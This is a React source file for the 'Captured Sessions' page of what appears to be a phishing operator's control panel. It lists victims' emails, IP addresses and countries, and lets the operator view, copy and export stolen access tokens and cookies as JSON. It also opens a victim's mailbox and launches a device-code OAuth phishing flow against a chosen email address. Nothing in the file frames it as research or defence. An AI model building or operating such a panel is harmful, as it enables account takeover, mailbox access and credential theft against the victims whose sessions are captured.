import { useState } from 'react'
import { Mail, Cookie, Globe, Trash2, RefreshCw, Trash, Upload, ShieldAlert } from 'lucide-react'
import { flag as flagEmoji, formatDate, truncate, copy } from '../lib/utils'
import Modal from './Modal'
import { useToast } from './Toast'
import { sessionsApi } from '../lib/api'
import OAuthFlowModal from './OAuthFlowModal'
import JWTDecoder from './JWTDecoder'

const IconBtn = ({ onClick, color, children, title, disabled }) => {
  const colors = {
    red: 'bg-danger/15 text-danger hover:bg-danger/25 border-danger/30 shadow-glow-danger',
    purple: 'bg-purple/15 text-purple hover:bg-purple/25 border-purple/30 shadow-glow-purple',
    green: 'bg-success/15 text-success hover:bg-success/25 border-success/30 shadow-glow-success'
  }
  return (
    <button
      onClick={disabled ? undefined : onClick}
      title={title}
      disabled={disabled}
      className={`w-9 h-9 rounded-lg border flex items-center justify-center transition ${colors[color] || colors.red} ${disabled ? 'opacity-40 cursor-not-allowed' : ''}`}
    >
      {children}
    </button>
  )
}

export default function CapturedSessionsTable({ rows, onRefresh, onDelete, loading }) {
  const toast = useToast()
  const [tab, setTab] = useState('all')
  const [mailEntry, setMailEntry] = useState(null)
  const [mailToken, setMailToken] = useState(null)
  const [mailLoading, setMailLoading] = useState(false)
  const [tokenCache, setTokenCache] = useState({})
  const [cookiesOpen, setCookiesOpen] = useState(null)
  const [cookiesData, setCookiesData] = useState(null)
  const [confirmDel, setConfirmDel] = useState(null)
  const [phishOpen, setPhishOpen] = useState(null)
  const [decoderEntry, setDecoderEntry] = useState(null)

  const safeRows = Array.isArray(rows) ? rows : []
  const filtered = safeRows.filter((r) => {
    const s = (r.status || 'Active').toLowerCase()
    if (tab === 'all') return true
    return s === tab
  })

  const clearExpired = () => {
    safeRows.filter((r) => (r.status || '').toLowerCase() === 'expired').forEach((r) => onDelete(r.id))
    toast.success('Expired sessions cleared')
  }

  const deleteAll = () => {
    if (window.confirm('Delete ALL captured sessions?')) {
      safeRows.forEach((r) => onDelete(r.id))
      toast.success('All sessions deleted')
    }
  }

  const fetchMailToken = async (row) => {
    if (!row || row.id == null) {
      toast.error('Invalid session row')
      return null
    }
    setMailLoading(true)
    try {
      const data = await sessionsApi.mailToken(row.id)
      const token = data?.token || data?.access_token || null
      const safe = {
        token,
        decoded: data?.decoded || null,
        row: { id: row.id, email: row.email, name: row.name }
      }
      setMailToken(safe)
      setTokenCache((c) => ({ ...c, [row.id]: safe }))
      if (!safe.token) toast.info(`No access_token stored for ${row.email || row.id}`)
      return safe
    } catch (e) {
      const empty = { token: null, decoded: null, row: { id: row.id, email: row.email } }
      setMailToken(empty)
      toast.error(`Failed to load token for ${row.email || row.id}`)
      return empty
    } finally {
      setMailLoading(false)
    }
  }

  const openMail = async (row) => {
    if (!row) return
    setMailEntry(row)
    setMailToken(tokenCache[row.id] || null)
    await fetchMailToken(row)
  }

  const closeMail = () => {
    setMailEntry(null)
  }

  const openCookies = async (row) => {
    if (!row) return
    setCookiesOpen(row)
    setCookiesData(null)
    try {
      const data = await sessionsApi.cookies(row.id)
      setCookiesData(data?.cookies || [])
    } catch {
      toast.error(`Failed to load cookies for ${row.email || row.id}`)
      setCookiesData([])
    }
  }

  const startDecoderForRow = async (row) => {
    if (!row) return
    let tokenData = tokenCache[row.id]
    if (!tokenData || !tokenData.token) {
      tokenData = await fetchMailToken(row)
    }
    setMailEntry(null)
    setDecoderEntry({ ...row, rawToken: tokenData?.token || null })
  }

  const closeDecoder = () => {
    setDecoderEntry(null)
  }

  return (
    <div className="glass rounded-2xl p-5 border border-white/10">
      <div className="flex flex-wrap items-center justify-between gap-3 mb-4">
        <div className="flex items-center gap-3">
          <h3 className="text-lg font-semibold text-white">Captured Sessions</h3>
          <span className="text-xs text-gray-400 bg-white/5 px-2 py-1 rounded-full">{filtered.length} of {safeRows.length}</span>
        </div>
        <div className="flex items-center gap-2 flex-wrap">
          <label className="flex items-center gap-2 text-xs text-gray-400 cursor-pointer">
            <input type="checkbox" style={{ accentColor: '#3498db' }} className="w-4 h-4" />Auto-refresh
          </label>
          <button onClick={onRefresh} className="px-3 py-2 rounded-lg bg-white/5 hover:bg-white/10 text-gray-300 text-xs flex items-center gap-2">
            <RefreshCw size={14} />Refresh
          </button>
          <button onClick={clearExpired} className="px-3 py-2 rounded-lg bg-white/5 hover:bg-white/10 text-gray-300 text-xs flex items-center gap-2">
            <Trash size={14} />Clear Expired
          </button>
          <button onClick={deleteAll} className="px-3 py-2 rounded-lg bg-danger/15 hover:bg-danger/25 text-danger text-xs flex items-center gap-2">
            <Trash size={14} />Delete All
          </button>
          <button onClick={() => toast.info('Import from file — wire to /sessions/import')} className="px-3 py-2 rounded-lg bg-accent/15 hover:bg-accent/25 text-accent text-xs flex items-center gap-2">
            <Upload size={14} />Import Session
          </button>
        </div>
      </div>

      <div className="flex gap-1 mb-3 border-b border-white/5">
        {['active', 'expired', 'all'].map((t) => (
          <button key={t} onClick={() => setTab(t)}
            className={`px-4 py-2 text-sm capitalize transition border-b-2 ${tab === t ? 'text-accent border-accent' : 'text-gray-400 border-transparent hover:text-white'}`}>
            {t}
          </button>
        ))}
      </div>

      <div className="overflow-x-auto rounded-xl border border-white/5">
        <table className="w-full text-sm">
          <thead className="bg-white/5 text-gray-400 text-xs uppercase tracking-wider">
            <tr>
              <th className="px-4 py-3 text-left">Email</th>
              <th className="px-4 py-3 text-left">IP Address</th>
              <th className="px-4 py-3 text-left">Country</th>
              <th className="px-4 py-3 text-left">Status</th>
              <th className="px-4 py-3 text-left">Captured</th>
              <th className="px-4 py-3 text-center">Actions</th>
            </tr>
          </thead>
          <tbody>
            {filtered.length === 0 && (
              <tr>
                <td colSpan={6} className="text-center text-gray-500 py-10">
                  {loading ? 'Loading…' : 'No sessions yet — trigger a phish campaign to populate.'}
                </td>
              </tr>
            )}
            {filtered.map((row) => (
              <tr key={row.id} className="border-t border-white/5 hover:bg-white/5 transition">
                <td className="px-4 py-3 text-white">{truncate(row.email || 'unknown', 28)}</td>
                <td className="px-4 py-3 text-gray-300 font-mono text-xs">{row.ip || '0.0.0.0'}</td>
                <td className="px-4 py-3"><span className="text-xl">{flagEmoji(row.country || 'UNK')}</span></td>
                <td className="px-4 py-3">
                  <span className={`px-2 py-1 rounded-full text-xs font-medium ${
                    (row.status || 'Active') === 'Active'
                      ? 'bg-success/15 text-success border border-success/30'
                      : 'bg-danger/15 text-danger border border-danger/30'
                  }`}>
                    {row.status || 'Active'}
                  </span>
                </td>
                <td className="px-4 py-3 text-gray-400 text-xs">{formatDate(row.captured)}</td>
                <td className="px-4 py-3">
                  <div className="flex items-center justify-center gap-2">
                    <IconBtn color="red" title="Mail Token / Phish" onClick={() => openMail(row)}><Mail size={16} /></IconBtn>
                    <IconBtn color="purple" title="Cookies" onClick={() => openCookies(row)}><Cookie size={16} /></IconBtn>
                    <IconBtn color="green" title="Webmail" onClick={() => window.location.assign(`/admin/mailbox/${row.id}`)}><Globe size={16} /></IconBtn>
                    <IconBtn
                      color="green"
                      title="Decode JWT (auto-fetches token)"
                      disabled={!row.id}
                      onClick={() => startDecoderForRow(row)}
                    >
                      <span className="text-xs font-bold">JWT</span>
                    </IconBtn>
                    <IconBtn color="red" title="Delete" onClick={() => setConfirmDel(row)}><Trash2 size={16} /></IconBtn>
                  </div>
                </td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>

      <Modal open={!!mailEntry} onClose={closeMail} title={`Mail Token — ${mailEntry?.email || ''}`} size="lg"
        footer={<>
          <button onClick={closeMail} className="px-4 py-2 rounded-lg bg-white/5 hover:bg-white/10 text-sm text-gray-300">Close</button>
          <button
            onClick={() => { if (mailEntry) { setPhishOpen(mailEntry); closeMail() } }}
            disabled={!mailEntry}
            className="px-4 py-2 rounded-lg bg-danger hover:brightness-110 text-sm text-white shadow-glow-danger flex items-center gap-2 disabled:opacity-40"
          >
            <ShieldAlert size={14} />Start Device Phish
          </button>
          <button
            onClick={async () => {
              const ok = await copy(mailToken?.token || '')
              ok ? toast.success('Token copied') : toast.error('Copy failed')
            }}
            disabled={!mailToken?.token}
            className="px-4 py-2 rounded-lg bg-danger hover:brightness-110 text-sm text-white shadow-glow-danger disabled:opacity-40"
          >
            Copy Token
          </button>
          <button
            onClick={() => mailEntry && startDecoderForRow(mailEntry)}
            disabled={!mailEntry}
            className="px-4 py-2 rounded-lg bg-accent hover:brightness-110 text-sm text-white shadow-glow disabled:opacity-40"
          >
            Decode JWT
          </button>
        </>}>
        <div className="space-y-3">
          <div className="text-xs text-gray-400">Existing captured token for this session:</div>
          <pre className="bg-black/40 p-4 rounded-lg text-xs text-green-300 overflow-auto max-h-48 font-mono whitespace-pre-wrap break-all">
            {mailLoading
              ? 'Loading token from backend…'
              : mailToken?.token
                ? mailToken.token
                : 'no token captured yet'}
          </pre>
          <div className="border-t border-white/10 pt-3">
            <div className="text-xs text-gray-400 mb-2">
              No token yet? Launch a device-code phishing flow against this email — the "Start Device Phish" button above will wire it to
              <code className="text-accent"> /oauth/device/start</code> + <code className="text-accent">/oauth/device/submit</code>.
            </div>
          </div>
        </div>
      </Modal>

      <Modal open={!!cookiesOpen} onClose={() => setCookiesOpen(null)} title={`Cookies — ${cookiesOpen?.email || ''}`} size="lg"
        footer={<>
          <button onClick={() => setCookiesOpen(null)} className="px-4 py-2 rounded-lg bg-white/5 hover:bg-white/10 text-sm text-gray-300">Close</button>
          <button onClick={async () => {
            const json = JSON.stringify(cookiesData || [], null, 2)
            const blob = new Blob([json], { type: 'application/json' })
            const a = document.createElement('a')
            a.href = URL.createObjectURL(blob)
            a.download = `${cookiesOpen?.id || 'cookies'}-cookies.json`
            a.click()
            toast.success('Cookies exported')
          }} className="px-4 py-2 rounded-lg bg-purple hover:brightness-110 text-sm text-white shadow-glow-purple">Export JSON</button>
        </>}>
        <pre className="bg-black/40 p-4 rounded-lg text-xs text-purple-300 overflow-auto max-h-72 font-mono">
          {JSON.stringify(cookiesData || [], null, 2)}
        </pre>
      </Modal>

      <Modal open={!!confirmDel} onClose={() => setConfirmDel(null)} title="Delete Session"
        footer={<>
          <button onClick={() => setConfirmDel(null)} className="px-4 py-2 rounded-lg bg-white/5 hover:bg-white/10 text-sm text-gray-300">Cancel</button>
          <button
            onClick={() => {
              if (confirmDel) {
                onDelete(confirmDel.id)
                setTokenCache((c) => {
                  const n = { ...c }
                  delete n[confirmDel.id]
                  return n
                })
                setConfirmDel(null)
                toast.success(`Session ${confirmDel.email || confirmDel.id} deleted`)
              }
            }}
            className="px-4 py-2 rounded-lg bg-danger hover:brightness-110 text-sm text-white shadow-glow-danger"
          >
            Delete
          </button>
        </>}>
        <p className="text-gray-300">Are you sure you want to delete session for <span className="text-white font-medium">{confirmDel?.email}</span>?</p>
        <p className="text-sm text-gray-500 mt-2">This action cannot be undone.</p>
      </Modal>

      {phishOpen && (
        <OAuthFlowModal
          open={!!phishOpen}
          onClose={() => setPhishOpen(null)}
          sessionEmail={phishOpen.email}
        />
      )}

      {decoderEntry && (
        <JWTDecoder
          open={!!decoderEntry}
          onClose={closeDecoder}
          tokenName={decoderEntry.name || null}
          rawToken={decoderEntry.rawToken || null}
        />
      )}
    </div>
  )
}